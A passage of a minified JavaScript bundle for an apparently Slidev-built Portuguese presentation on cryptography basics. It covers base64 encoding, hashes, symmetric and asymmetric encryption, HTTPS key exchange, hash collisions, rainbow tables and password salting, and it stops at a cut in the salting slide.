s},this.instanceOf=t.instanceOf||null,this.predicate=t.predicate||null,this.represent=t.represent||null,this.representName=t.representName||null,this.defaultStyle=t.defaultStyle||null,this.multi=t.multi||!1,this.styleAliases=Y_(t.styleAliases||null),W_.indexOf(this.kind)===-1)throw new Cn('Unknown kind "'+this.kind+'" is specified for "'+e+'" YAML type.')}var nt=K_;function Ga(e,t){var s=[];return e[t].forEach(function(o){var r=s.length;s.forEach(function(l,i){l.tag===o.tag&&l.kind===o.kind&&l.multi===o.multi&&(r=i)}),s[r]=o}),s}function X_(){var e={scalar:{},sequence:{},mapping:{},fallback:{},multi:{scalar:[],sequence:[],mapping:[],fallback:[]}},t,s;function o(r){r.multi?(e.multi[r.kind].push(r),e.multi.fallback.push(r)):e[r.kind][r.tag]=e.fallback[r.tag]=r}for(t=0,s=arguments.length;t<s;t+=1)arguments[t].forEach(o);return e}function cl(e){return this.extend(e)}cl.prototype.extend=function(t){var s=[],o=[];if(t instanceof nt)o.push(t);else if(Array.isArray(t))o=o.concat(t);else if(t&&(Array.isArray(t.implicit)||Array.isArray(t.explicit)))t.implicit&&(s=s.concat(t.implicit)),t.explicit&&(o=o.concat(t.explicit));else throw new Cn("Schema.extend argument should be a Type, [ Type ], or a schema definition ({ implicit: [...], explicit: [...] })");s.forEach(function(l){if(!(l instanceof nt))throw new Cn("Specified list of YAML types (or a single Type object) contains a non-Type object.");if(l.loadKind&&l.loadKind!=="scalar")throw new Cn("There is a non-scalar type in the implicit list of a schema. Implicit resolving of such types is not supported.");if(l.multi)throw new Cn("There is a multi type in the implicit list of a schema. Multi tags can only be listed as explicit.")}),o.forEach(function(l){if(!(l instanceof nt))throw new Cn("Specified list of YAML types (or a single Type object) contains a non-Type object.")});var r=Object.create(cl.prototype);return r.implicit=(this.implicit||[]).concat(s),r.explicit=(this.explicit||[]).concat(o),r.compiledImplicit=Ga(r,"implicit"),r.compiledExplicit=Ga(r,"explicit"),r.compiledTypeMap=X_(r.compiledImplicit,r.compiledExplicit),r};var Q_=cl,Z_=new nt("tag:yaml.org,2002:str",{kind:"scalar",construct:function(e){return e!==null?e:""}}),G_=new nt("tag:yaml.org,2002:seq",{kind:"sequence",construct:function(e){return e!==null?e:[]}}),J_=new nt("tag:yaml.org,2002:map",{kind:"mapping",construct:function(e){return e!==null?e:{}}}),eb=new Q_({explicit:[Z_,G_,J_]});function tb(e){if(e===null)return!0;var t=e.length;return t===1&&e==="~"||t===4&&(e==="null"||e==="Null"||e==="NULL")}function nb(){return null}function sb(e){return e===null}var ob=new nt("tag:yaml.org,2002:null",{kind:"scalar",resolve:tb,construct:nb,predicate:sb,represent:{canonical:function(){return"~"},lowercase:function(){return"null"},uppercase:function(){return"NULL"},camelcase:function(){return"Null"},empty:function(){return""}},defaultStyle:"lowercase"});function rb(e){if(e===null)return!1;var t=e.length;return t===4&&(e==="true"||e==="True"||e==="TRUE")||t===5&&(e==="false"||e==="False"||e==="FALSE")}function lb(e){return e==="true"||e==="True"||e==="TRUE"}function ib(e){return Object.prototype.toString.call(e)==="[object Boolean]"}var ab=new nt("tag:yaml.org,2002:bool",{kind:"scalar",resolve:rb,construct:lb,predicate:ib,represent:{lowercase:function(e){return e?"true":"false"},uppercase:function(e){return e?"TRUE":"FALSE"},camelcase:function(e){return e?"True":"False"}},defaultStyle:"lowercase"});function cb(e){return 48<=e&&e<=57||65<=e&&e<=70||97<=e&&e<=102}function ub(e){return 48<=e&&e<=55}function db(e){return 48<=e&&e<=57}function pb(e){if(e===null)return!1;var t=e.length,s=0,o=!1,r;if(!t)return!1;if(r=e[s],(r==="-"||r==="+")&&(r=e[++s]),r==="0"){if(s+1===t)return!0;if(r=e[++s],r==="b"){for(s++;s<t;s++)if(r=e[s],r!=="_"){if(r!=="0"&&r!=="1")return!1;o=!0}return o&&r!=="_"}if(r==="x"){for(s++;s<t;s++)if(r=e[s],r!=="_"){if(!cb(e.charCodeAt(s)))return!1;o=!0}return o&&r!=="_"}if(r==="o"){for(s++;s<t;s++)if(r=e[s],r!=="_"){if(!ub(e.charCodeAt(s)))return!1;o=!0}return o&&r!=="_"}}if(r==="_")return!1;for(;s<t;s++)if(r=e[s],r!=="_"){if(!db(e.charCodeAt(s)))return!1;o=!0}return!(!o||r==="_")}function fb(e){var t=e,s=1,o;if(t.indexOf("_")!==-1&&(t=t.replace(/_/g,"")),o=t[0],(o==="-"||o==="+")&&(o==="-"&&(s=-1),t=t.slice(1),o=t[0]),t==="0")return 0;if(o==="0"){if(t[1]==="b")return s*parseInt(t.slice(2),2);if(t[1]==="x")return s*parseInt(t.slice(2),16);if(t[1]==="o")return s*parseInt(t.slice(2),8)}return s*parseInt(t,10)}function mb(e){return Object.prototype.toString.call(e)==="[object Number]"&&e%1===0&&!Jl.isNegativeZero(e)}var hb=new nt("tag:yaml.org,2002:int",{kind:"scalar",resolve:pb,construct:fb,predicate:mb,represent:{binary:function(e){return e>=0?"0b"+e.toString(2):"-0b"+e.toString(2).slice(1)},octal:function(e){return e>=0?"0o"+e.toString(8):"-0o"+e.toString(8).slice(1)},decimal:function(e){return e.toString(10)},hexadecimal:function(e){return e>=0?"0x"+e.toString(16).toUpperCase():"-0x"+e.toString(16).toUpperCase().slice(1)}},defaultStyle:"decimal",styleAliases:{binary:[2,"bin"],octal:[8,"oct"],decimal:[10,"dec"],hexadecimal:[16,"hex"]}}),gb=new RegExp("^(?:[-+]?(?:[0-9][0-9_]*)(?:\\.[0-9_]*)?(?:[eE][-+]?[0-9]+)?|\\.[0-9_]+(?:[eE][-+]?[0-9]+)?|[-+]?\\.(?:inf|Inf|INF)|\\.(?:nan|NaN|NAN))$");function yb(e){return!(e===null||!gb.test(e)||e[e.length-1]==="_")}function vb(e){var t,s;return t=e.replace(/_/g,"").toLowerCase(),s=t[0]==="-"?-1:1,"+-".indexOf(t[0])>=0&&(t=t.slice(1)),t===".inf"?s===1?Number.POSITIVE_INFINITY:Number.NEGATIVE_INFINITY:t===".nan"?NaN:s*parseFloat(t,10)}var _b=/^[-+]?[0-9]+e/;function bb(e,t){var s;if(isNaN(e))switch(t){case"lowercase":return".nan";case"uppercase":return".NAN";case"camelcase":return".NaN"}else if(Number.POSITIVE_INFINITY===e)switch(t){case"lowercase":return".inf";case"uppercase":return".INF";case"camelcase":return".Inf"}else if(Number.NEGATIVE_INFINITY===e)switch(t){case"lowercase":return"-.inf";case"uppercase":return"-.INF";case"camelcase":return"-.Inf"}else if(Jl.isNegativeZero(e))return"-0.0";return s=e.toString(10),_b.test(s)?s.replace("e",".e"):s}function xb(e){return Object.prototype.toString.call(e)==="[object Number]"&&(e%1!==0||Jl.isNegativeZero(e))}var wb=new nt("tag:yaml.org,2002:float",{kind:"scalar",resolve:yb,construct:vb,predicate:xb,represent:bb,defaultStyle:"lowercase"}),Eb=eb.extend({implicit:[ob,ab,hb,wb]}),Ab=Eb,yd=new RegExp("^([0-9][0-9][0-9][0-9])-([0-9][0-9])-([0-9][0-9])$"),vd=new RegExp("^([0-9][0-9][0-9][0-9])-([0-9][0-9]?)-([0-9][0-9]?)(?:[Tt]|[ \\t]+)([0-9][0-9]?):([0-9][0-9]):([0-9][0-9])(?:\\.([0-9]*))?(?:[ \\t]*(Z|([-+])([0-9][0-9]?)(?::([0-9][0-9]))?))?$");function Sb(e){return e===null?!1:yd.exec(e)!==null||vd.exec(e)!==null}function kb(e){var t,s,o,r,l,i,a,c=0,u=null,d,p,f;if(t=yd.exec(e),t===null&&(t=vd.exec(e)),t===null)throw new Error("Date resolve error");if(s=+t[1],o=+t[2]-1,r=+t[3],!t[4])return new Date(Date.UTC(s,o,r));if(l=+t[4],i=+t[5],a=+t[6],t[7]){for(c=t[7].slice(0,3);c.length<3;)c+="0";c=+c}return t[9]&&(d=+t[10],p=+(t[11]||0),u=(d*60+p)*6e4,t[9]==="-"&&(u=-u)),f=new Date(Date.UTC(s,o,r,l,i,a,c)),u&&f.setTime(f.getTime()-u),f}function Cb(e){return e.toISOString()}var $b=new nt("tag:yaml.org,2002:timestamp",{kind:"scalar",resolve:Sb,construct:kb,instanceOf:Date,represent:Cb});function Db(e){return e==="<<"||e===null}var Bb=new nt("tag:yaml.org,2002:merge",{kind:"scalar",resolve:Db}),ei=`ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=
\r`;function Fb(e){if(e===null)return!1;var t,s,o=0,r=e.length,l=ei;for(s=0;s<r;s++)if(t=l.indexOf(e.charAt(s)),!(t>64)){if(t<0)return!1;o+=6}return o%8===0}function Ob(e){var t,s,o=e.replace(/[\r\n=]/g,""),r=o.length,l=ei,i=0,a=[];for(t=0;t<r;t++)t%4===0&&t&&(a.push(i>>16&255),a.push(i>>8&255),a.push(i&255)),i=i<<6|l.indexOf(o.charAt(t));return s=r%4*6,s===0?(a.push(i>>16&255),a.push(i>>8&255),a.push(i&255)):s===18?(a.push(i>>10&255),a.push(i>>2&255)):s===12&&a.push(i>>4&255),new Uint8Array(a)}function Ib(e){var t="",s=0,o,r,l=e.length,i=ei;for(o=0;o<l;o++)o%3===0&&o&&(t+=i[s>>18&63],t+=i[s>>12&63],t+=i[s>>6&63],t+=i[s&63]),s=(s<<8)+e[o];return r=l%3,r===0?(t+=i[s>>18&63],t+=i[s>>12&63],t+=i[s>>6&63],t+=i[s&63]):r===2?(t+=i[s>>10&63],t+=i[s>>4&63],t+=i[s<<2&63],t+=i[64]):r===1&&(t+=i[s>>2&63],t+=i[s<<4&63],t+=i[64],t+=i[64]),t}function Tb(e){return Object.prototype.toString.call(e)==="[object Uint8Array]"}var Pb=new nt("tag:yaml.org,2002:binary",{kind:"scalar",resolve:Fb,construct:Ob,predicate:Tb,represent:Ib}),Mb=Object.prototype.hasOwnProperty,Lb=Object.prototype.toString;function Rb(e){if(e===null)return!0;var t=[],s,o,r,l,i,a=e;for(s=0,o=a.length;s<o;s+=1){if(r=a[s],i=!1,Lb.call(r)!=="[object Object]")return!1;for(l in r)if(Mb.call(r,l))if(!i)i=!0;else return!1;if(!i)return!1;if(t.indexOf(l)===-1)t.push(l);else return!1}return!0}function Nb(e){return e!==null?e:[]}var qb=new nt("tag:yaml.org,2002:omap",{kind:"sequence",resolve:Rb,construct:Nb}),jb=Object.prototype.toString;function Hb(e){if(e===null)return!0;var t,s,o,r,l,i=e;for(l=new Array(i.length),t=0,s=i.length;t<s;t+=1){if(o=i[t],jb.call(o)!=="[object Object]"||(r=Object.keys(o),r.length!==1))return!1;l[t]=[r[0],o[r[0]]]}return!0}function zb(e){if(e===null)return[];var t,s,o,r,l,i=e;for(l=new Array(i.length),t=0,s=i.length;t<s;t+=1)o=i[t],r=Object.keys(o),l[t]=[r[0],o[r[0]]];return l}var Vb=new nt("tag:yaml.org,2002:pairs",{kind:"sequence",resolve:Hb,construct:zb}),Ub=Object.prototype.hasOwnProperty;function Wb(e){if(e===null)return!0;var t,s=e;for(t in s)if(Ub.call(s,t)&&s[t]!==null)return!1;return!0}function Yb(e){return e!==null?e:{}}var Kb=new nt("tag:yaml.org,2002:set",{kind:"mapping",resolve:Wb,construct:Yb});Ab.extend({implicit:[$b,Bb],explicit:[Pb,qb,Vb,Kb]});function Ja(e){return e===48?"\0":e===97?"\x07":e===98?"\b":e===116||e===9?"	":e===110?`
`:e===118?"\v":e===102?"\f":e===114?"\r":e===101?"\x1B":e===32?" ":e===34?'"':e===47?"/":e===92?"\\":e===78?"\x85":e===95?"\xA0":e===76?"\u2028":e===80?"\u2029":""}var Xb=new Array(256),Qb=new Array(256);for(var Vn=0;Vn<256;Vn++)Xb[Vn]=Ja(Vn)?1:0,Qb[Vn]=Ja(Vn);function Zb(e){return Array.from(new Set(e))}function ec(...e){let t,s,o;e.length===1?(t=0,o=1,[s]=e):[t,s,o=1]=e;const r=[];let l=t;for(;l<s;)r.push(l),l+=o||1;return r}function Gb(e,t){if(!t||t==="all"||t==="*")return ec(1,e+1);const s=[];for(const o of t.split(/[,;]/g))if(!o.includes("-"))s.push(+o);else{const[r,l]=o.split("-",2);s.push(...ec(+r,l?+l+1:e+1))}return Zb(s).filter(o=>o<=e).sort((o,r)=>o-r)}const Jb=["title"],gs=Ae({__name:"CodeBlockWrapper",props:{ranges:{default:()=>[]},at:{type:Number,default:void 0},maxHeight:{type:String,default:void 0}},setup(e){const t=e;N(U);const s=N(Fs),o=N(kn),r=N(Os);function l(p=5){const f=[],m="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789",h=m.length;for(let x=0;x<p;x++)f.push(m.charAt(Math.floor(Math.random()*h)));return f.join("")}const i=z(),a=hn();ps(()=>{const p=t.at==null?o==null?void 0:o.value.length:t.at,f=D(()=>r!=null&&r.value?t.ranges.length-1:Math.min(Math.max(0,((s==null?void 0:s.value)||0)-(p||0)),t.ranges.length-1)),m=D(()=>t.ranges[f.value]||"");if(t.ranges.length>=2&&!(r!=null&&r.value)){const h=l(),x=Gm(t.ranges.length-1).map(b=>h+b);o!=null&&o.value&&(o.value.push(...x),tr(()=>x.forEach(b=>Qr(o.value,b)),a))}to(()=>{if(!i.value)return;const x=i.value.querySelector(".shiki-dark")?Array.from(i.value.querySelectorAll(".shiki")):[i.value];for(const b of x){const k=Array.from(b.querySelectorAll(".line")),S=Gb(k.length,m.value);if(k.forEach((E,B)=>{const L=S.includes(B+1);E.classList.toggle(En,!0),E.classList.toggle("highlighted",L),E.classList.toggle("dishonored",!L)}),t.maxHeight){const E=b.querySelector(".line.highlighted");E&&E.scrollIntoView({behavior:"smooth",block:"center"})}}})});const{copied:c,copy:u}=n0();function d(){var f,m;const p=(m=(f=i.value)==null?void 0:f.querySelector(".slidev-code"))==null?void 0:m.textContent;p&&u(p)}return(p,f)=>{const m=I_,h=$_;return _(),$("div",{ref_key:"el",ref:i,class:"slidev-code-wrapper relative group",style:Ze({"max-height":t.maxHeight,"overflow-y":t.maxHeight?"scroll":void 0})},[Ut(p.$slots,"default"),w(we).codeCopy?(_(),$("button",{key:0,class:"slidev-code-copy absolute top-0 right-0 transition opacity-0 group-hover:opacity-20 hover:!opacity-100",title:w(c)?"Copied":"Copy",onClick:f[0]||(f[0]=x=>d())},[w(c)?(_(),Y(m,{key:0,class:"p-2 w-8 h-8"})):(_(),Y(h,{key:1,class:"p-2 w-8 h-8"}))],8,Jb)):he("v-if",!0)],4)}}}),e5=n("h1",null,"Criptografia != Encode",-1),t5=n("p",null,"Encode \xE9 apenas uma codifica\xE7\xE3o simples de dados, enquanto a criptografia envolve um segredo que apenas quem est\xE1 autorizado tem posse.",-1),n5=n("div",null,[n("h5",null,"Tipos de Encode"),n("ul",null,[n("li",null,"Base16"),n("li",null,"Base32"),n("li",null,"Base64"),n("li",null,"Base85")])],-1),s5=n("br",null,null,-1),o5=y(" Encode: "),r5=n("pre",{class:"shiki-container"},[n("pre",{class:"slidev-code shiki shiki-dark",style:{"background-color":"#121212"}},[n("code",null,[n("span",{class:"line"},[n("span",{style:{color:"#E0A569"}},"echo"),n("span",{style:{color:"#DBD7CA"}}," "),n("span",{style:{color:"#C98A7D"}},'"Esta \xE9 uma mensagem SECRETA!!!"'),n("span",{style:{color:"#DBD7CA"}}," "),n("span",{style:{color:"#CB7676"}},"|"),n("span",{style:{color:"#DBD7CA"}}," base64")]),y(`
`),n("span",{class:"line"},[n("span",{style:{color:"#DBD7CA"}},"RXN0YSDDqSB1bWEgbWVuc2FnZW0gU0VDUkVUQSEhIQo=")])])]),n("pre",{class:"slidev-code shiki shiki-light",style:{"background-color":"#ffffff"}},[n("code",null,[n("span",{class:"line"},[n("span",{style:{color:"#B58451"}},"echo"),n("span",{style:{color:"#393A34"}}," "),n("span",{style:{color:"#B56959"}},'"Esta \xE9 uma mensagem SECRETA!!!"'),n("span",{style:{color:"#393A34"}}," "),n("span",{style:{color:"#AB5959"}},"|"),n("span",{style:{color:"#393A34"}}," base64")]),y(`
`),n("span",{class:"line"},[n("span",{style:{color:"#393A34"}},"RXN0YSDDqSB1bWEgbWVuc2FnZW0gU0VDUkVUQSEhIQo=")])])])],-1),l5=n("p",null,"Decode:",-1),i5=n("pre",{class:"shiki-container"},[n("pre",{class:"slidev-code shiki shiki-dark",style:{"background-color":"#121212"}},[n("code",null,[n("span",{class:"line"},[n("span",{style:{color:"#E0A569"}},"echo"),n("span",{style:{color:"#DBD7CA"}}," "),n("span",{style:{color:"#C98A7D"}},'"RXN0YSDDqSB1bWEgbWVuc2FnZW0gU0VDUkVUQSEhIQo="'),n("span",{style:{color:"#DBD7CA"}}," "),n("span",{style:{color:"#CB7676"}},"|"),n("span",{style:{color:"#DBD7CA"}}," base64 -d")]),y(`
`),n("span",{class:"line"},[n("span",{style:{color:"#C98A7D"}},'"Esta \xE9 uma mensagem SECRETA!!!"')])])]),n("pre",{class:"slidev-code shiki shiki-light",style:{"background-color":"#ffffff"}},[n("code",null,[n("span",{class:"line"},[n("span",{style:{color:"#B58451"}},"echo"),n("span",{style:{color:"#393A34"}}," "),n("span",{style:{color:"#B56959"}},'"RXN0YSDDqSB1bWEgbWVuc2FnZW0gU0VDUkVUQSEhIQo="'),n("span",{style:{color:"#393A34"}}," "),n("span",{style:{color:"#AB5959"}},"|"),n("span",{style:{color:"#393A34"}}," base64 -d")]),y(`
`),n("span",{class:"line"},[n("span",{style:{color:"#B56959"}},'"Esta \xE9 uma mensagem SECRETA!!!"')])])])],-1),a5={__name:"11",setup(e){const t={srcSequence:"./slides/13.cipher-encode.md"};return N(U),(s,o)=>{const r=gs,l=He("click");return _(),Y(Ce,pe(de(t)),{default:X(()=>[e5,t5,n("div",null,[n5,s5,W((_(),$("div",null,[o5,C(r,Qe({},{ranges:[""]}),{default:X(()=>[r5]),_:1},16),l5,C(r,Qe({},{ranges:[""]}),{default:X(()=>[i5]),_:1},16)])),[[l]])])]),_:1},16)}}};const c5=n("h1",null,"Criptografia != Hash",-1),u5=n("p",null,"Hash gera uma sa\xEDda de tamanho fixo que \xE9 matematicamente irrevers\xEDvel, enquanto a criptografia gera uma sa\xEDda vari\xE1vel conforme o tamanho da mensagem, e \xE9 revers\xEDvel para quem tiver posse do segredo.",-1),d5=n("br",null,null,-1),p5=n("table",null,[n("thead",null,[n("tr",null,[n("th",null,"Algor\xEDtmo"),n("th",null,"Entrada"),n("th",null,"Sa\xEDda"),n("th",null,"Tamanho")])]),n("tbody",null,[n("tr",null,[n("td",null,"MD5"),n("td",null,"123"),n("td",null,"202cb962ac59075b964b07152d234b70"),n("td",null,"32")]),n("tr",null,[n("td",null,"MD5"),n("td",null,"123asd"),n("td",null,"e120ea280aa50693d5568d0071456460"),n("td",null,"32")]),n("tr",null,[n("td",null,"SHA1"),n("td",null,"123"),n("td",null,"40bd001563085fc35165329ea1ff5c5ecbdbbeef"),n("td",null,"40")]),n("tr",null,[n("td",null,"SHA1"),n("td",null,"123asd"),n("td",null,"ec4c8836db96b8aca8381c7c64bb095ba46d5e28"),n("td",null,"40")]),n("tr",null,[n("td",null,"SHA256"),n("td",null,"123"),n("td",null,"a665a45920422f9d417e4867efdc4fb8a04a1f3fff1fa07e998e86f7f7a27ae3"),n("td",null,"64")]),n("tr",null,[n("td",null,"SHA256"),n("td",null,"123asd"),n("td",null,"049a68c15c0d6e26c8b4a0743e6b87f074864c2fae5983c88956cb2882d608f5"),n("td",null,"64")])])],-1),f5=[p5],m5={__name:"12",setup(e){const t={srcSequence:"./slides/14.cipher-hash.md"};return N(U),(s,o)=>{const r=He("click");return _(),Y(Ce,pe(de(t)),{default:X(()=>[c5,u5,d5,W((_(),$("div",null,f5)),[[r]])]),_:1},16)}}},h5=n("h1",null,"Criptografia Sim\xE9trica",-1),g5=n("p",null,"Apenas uma chave \xE9 utilizada tanto para criptografar quanto para descriptografar os dados.",-1),y5=n("div",null,[n("ul",null,[n("li",null,"DES (Data Encryption Standard)"),n("li",null,"3DES (Triple DES)"),n("li",null,"IDEA (International Data Encryption Algorithm)"),n("li",null,"AES (Advanced Encryption Standard)")])],-1),v5={__name:"13",setup(e){const t={srcSequence:"./slides/15.symmetric-cryptography.md"};return N(U),(s,o)=>{const r=Ne,l=He("click");return _(),Y(Ce,pe(de(t)),{default:X(()=>[h5,g5,y5,W((_(),$("div",null,[C(r,{src:"criptografia-simetrica.png",width:"600",style:{margin:"0 auto","border-radius":"20px","margin-top":"10px"}})])),[[l]])]),_:1},16)}}},_5=n("h1",null,"Criptografia Assim\xE9trica",-1),b5=n("p",null,"Tamb\xE9m conhecida como criptografia de chave p\xFAblica, faz uso de um par de chaves (p\xFAblica e privada) para garantir a privacidade das mensagens.",-1),x5=n("ul",null,[n("li",null,"RSA (Ron Rivest, Adi Shamir e Leonard Adleman)")],-1),w5=[x5],E5={__name:"14",setup(e){const t={srcSequence:"./slides/16.assymmetric-cryptography.md"};return N(U),(s,o)=>{const r=Ne,l=He("click");return _(),Y(Ce,pe(de(t)),{default:X(()=>[_5,b5,W((_(),$("div",null,w5)),[[l]]),W((_(),$("div",null,[C(r,{src:"assimetric-cryptography.png",style:{margin:"0 auto","margin-top":"50px"},width:"500"})])),[[l]])]),_:1},16)}}},A5=n("h1",null,"Vantagens e desvantagens",-1),S5=n("ul",null,[n("li",null,[y("Sim\xE9trica "),n("ul",null,[n("li",null,"Algoritmo simples"),n("li",null,"R\xE1pida"),n("li",null,"A chave pode ser interceptada durante o compartilhamento")])]),n("li",null,[y("Assim\xE9trica "),n("ul",null,[n("li",null,"Algoritmo complexo"),n("li",null,"A chave p\xFAblica pode ser distribu\xEDda para qualquer pessoa"),n("li",null,"Lenta"),n("li",null,"Necessitam de um maior poder de processamento")])])],-1),k5={__name:"15",setup(e){const t={srcSequence:"./slides/17.advantages.md"};return N(U),(s,o)=>(_(),Y(Ce,pe(de(t)),{default:X(()=>[A5,S5]),_:1},16))}},C5=n("h1",null,"Proton Mail",-1),$5={__name:"16",setup(e){const t={srcSequence:"./slides/18.protonmail.md"};return N(U),(s,o)=>{const r=Ne;return _(),Y(Ce,pe(de(t)),{default:X(()=>[C5,n("div",null,[C(r,{src:"zero-access-encryption.png",style:{"border-radius":"20px",margin:"0 auto","margin-top":"80px",width:"700px"}})])]),_:1},16)}}},D5=n("h1",null,"Posso utilizar os dois ?",-1),B5={__name:"17",setup(e){const t={layout:"center",class:"text-center",srcSequence:"./slides/20.https.md"};return N(U),(s,o)=>{const r=Ne;return _(),Y(gn,pe(de(t)),{default:X(()=>[D5,n("div",null,[C(r,{src:"question-guy.png",style:{margin:"0 auto"}})])]),_:1},16)}}},F5=n("h1",null,"HTTP\u2019s",-1),O5=n("br",null,null,-1),I5={grid:"~ cols-3"},T5={class:"text-center"},P5=n("span",null,"Browser",-1),M5={style:{"margin-top":"10px"},class:"text-center"},L5=n("span",{style:{color:"red"}},"Man In The Middle",-1),R5={class:"text-center"},N5=n("span",null,"Servidor",-1),q5=n("br",null,null,-1),j5=n("ol",null,[n("li",null,"Browser solicita chave p\xFAblica para o servidor."),n("li",null,"Servidor entrega chave p\xFAblica para o browser."),n("li",null,"Browser gera uma chave aleat\xF3ria e criptografa com a chave p\xFAblica do servidor."),n("li",null,"A chave gerada e criptografada \xE9 enviada para o servidor."),n("li",null,"Servidor descriptografa utilizando a chave privada."),n("li",null,"Comunica\xE7\xE3o para a ser utilizando apenas a chave aleat\xF3ria gerada.")],-1),H5=[j5],z5={__name:"18",setup(e){const t={srcSequence:"./slides/21.https.md"};return N(U),(s,o)=>{const r=Ne,l=hs,i=He("click");return _(),Y(Ce,pe(de(t)),{default:X(()=>[F5,O5,n("div",I5,[n("div",T5,[C(r,{src:"/firefox-logo.png",style:"width:100px;height:100px;margin: 0 auto",class:Pe("img-hor-vert")},null,8,["src"]),P5]),n("div",M5,[C(r,{src:"/hacker.png",style:"width:100px;height:100px;margin: 0 auto"},null,8,["src"]),L5]),n("div",R5,[C(r,{src:"/server-icon.png",style:"width:100px;height:100px;margin: 0 auto",class:Pe("img-hor-vert")},null,8,["src"]),N5])]),C(l,{x1:"260",y1:"160",x2:"430",y2:"160",color:"#ccc",width:"3",arrowSize:"1"}),C(l,{x1:"560",y1:"160",x2:"720",y2:"160",color:"#ccc",width:"3",arrowSize:"1"}),C(l,{x1:"430",y1:"210",x2:"260",y2:"210",color:"#ccc",width:"3",arrowSize:"1"}),C(l,{x1:"720",y1:"210",x2:"560",y2:"210",color:"#ccc",width:"3",arrowSize:"1"}),q5,W((_(),$("div",null,H5)),[[i]])]),_:1},16)}}},V5=n("h1",null,"Um poucos mais sobre hashes\u2026",-1),U5={__name:"19",setup(e){const t={layout:"center",class:"text-center",srcSequence:"./slides/30.hash.md"};return N(U),(s,o)=>(_(),Y(gn,pe(de(t)),{default:X(()=>[V5]),_:1},16))}},W5=n("h1",null,"Colis\xE3o de HASH",-1),Y5=n("p",null,"Duas entradas diferentes acabam gerando a mesma sa\xEDda.",-1),K5={grid:"~ cols-2 gap-4",style:{"margin-top":"80px"}},X5={style:{"text-align":"center"}},Q5=y("98318-0209"),Z5=[Q5],G5=n("br",null,null,-1),J5=n("br",null,null,-1),e2=y("983 + 180 + 209"),t2=[e2],n2={style:{"text-align":"center"}},s2=y("99029-8084"),o2=[s2],r2=n("br",null,null,-1),l2=n("br",null,null,-1),i2=y("990 + 298 + 084"),a2=[i2],c2=n("br",null,null,-1),u2=n("br",null,null,-1),d2=n("br",null,null,-1),p2=n("br",null,null,-1),f2={style:{"text-align":"center",color:"red","font-weight":"bold"}},m2=n("span",null,"1372",-1),h2=[m2],g2={__name:"20",setup(e){const t={clicks:3,srcSequence:"./slides/31.hash.md"};return N(U),(s,o)=>{const r=hs,l=He("click");return _(),Y(Ce,pe(de(t)),{default:X(()=>[W5,Y5,n("div",K5,[n("div",X5,[W((_(),$("span",null,Z5)),[[l,1]]),G5,J5,W((_(),$("span",null,t2)),[[l,2]])]),n("div",n2,[W((_(),$("span",null,o2)),[[l,1]]),r2,l2,W((_(),$("span",null,a2)),[[l,2]])])]),c2,u2,d2,p2,W((_(),$("div",f2,h2)),[[l,3]]),W(C(r,{x1:"300",y1:"290",x2:"460",y2:"370",color:"#F00",width:"3",arrowSize:"1"},null,512),[[l,3]]),W(C(r,{x1:"680",y1:"290",x2:"520",y2:"370",color:"#F00",width:"3",arrowSize:"1"},null,512),[[l,3]])]),_:1},16)}}};const y2=n("h1",null,"Rainbow table",-1),v2=n("p",null,"Hashes pr\xE9-processados",-1),_2={grid:"~ cols-2"},b2={style:{"text-align":"center"}},x2=n("span",{style:{"font-size":"14px"}},"f25a2fc72690b780b2a14e140ef6a9e0",-1),w2=n("table",null,[n("thead",null,[n("tr",null,[n("th",null,"Id"),n("th",null,"Senha"),n("th",null,"Hash")])]),n("tbody",null,[n("tr",null,[n("td",null,"1"),n("td",null,"123456"),n("td",null,"e10adc3949ba59abbe56e057f20f883e")]),n("tr",null,[n("td",null,"2"),n("td",null,"12345"),n("td",null,"827ccb0eea8a706c4c34a16891f84e7b")]),n("tr",null,[n("td",null,"3"),n("td",null,"123456789"),n("td",null,"25f9e794323b453885f5181f1b624d0b")]),n("tr",null,[n("td",null,"4"),n("td",null,"password"),n("td",null,"5f4dcc3b5aa765d61d8327deb882cf99")]),n("tr",null,[n("td",null,"5"),n("td",null,"iloveyou"),n("td",null,"f25a2fc72690b780b2a14e140ef6a9e0")]),n("tr",null,[n("td",null,"6"),n("td",null,"princess"),n("td",null,"8afa847f50a716e64932d995c8e7435a")]),n("tr",null,[n("td",null,"7"),n("td",null,"1234567"),n("td",null,"fcea920f7412b5da7be0cf42b8c93759")]),n("tr",null,[n("td",null,"8"),n("td",null,"12345678"),n("td",null,"25d55ad283aa400af464c76d713c07ad")]),n("tr",null,[n("td",null,"9"),n("td",null,"abc123"),n("td",null,"e99a18c428cb38d5f260853678922e03")]),n("tr",null,[n("td",null,"10"),n("td",null,"nicole"),n("td",null,"fc63f87c08d505264caba37514cd0cfd")]),n("tr",null,[n("td",null,"11"),n("td",null,"daniel"),n("td",null,"aa47f8215c6f30a0dcdb2a36a9f4168e")]),n("tr",null,[n("td",null,"12"),n("td",null,"babygirl"),n("td",null,"67881381dbc68d4761230131ae0008f7")])])],-1),E2=[w2],A2={__name:"21",setup(e){const t={srcSequence:"./slides/32.hash.md"};return N(U),(s,o)=>{const r=Ne,l=hs,i=He("click");return _(),Y(Ce,pe(de(t)),{default:X(()=>[y2,v2,n("div",_2,[W((_(),$("div",b2,[C(r,{src:"hacker.png",style:{width:"100px",margin:"0 auto","margin-top":"80px"}}),x2])),[[i]]),W((_(),$("div",null,E2)),[[i,3]])]),W(C(l,{x1:"330",y1:"270",x2:"490",y2:"270",color:"#ccc",width:"3",arrowSize:"1"},null,512),[[i,2]])]),_:1},16)}}},S2=n("h1",null,"Rainbow table online",-1),k2={__name:"22",setup(e){const t={srcSequence:"./slides/33.hash.md"};return N(U),(s,o)=>{const r=Ne;return _(),Y(Ce,pe(de(t)),{default:X(()=>[S2,n("div",null,[C(r,{style:{"border-radius":"10px",margin:"0 auto",width:"800px","margin-top":"40px"},src:"rainbow-tables.png"})])]),_:1},16)}}};const C2=n("h1",null,"Salt de senha",-1),$2=n("p",null,"Adi\xE7\xE3o de um complemento na senha.",-1),D2={grid:"~ cols-2"},B2={style:{"text-align":"center"}},F2=n("span",{style:{"font-size":"14px"}},"iloveyou + 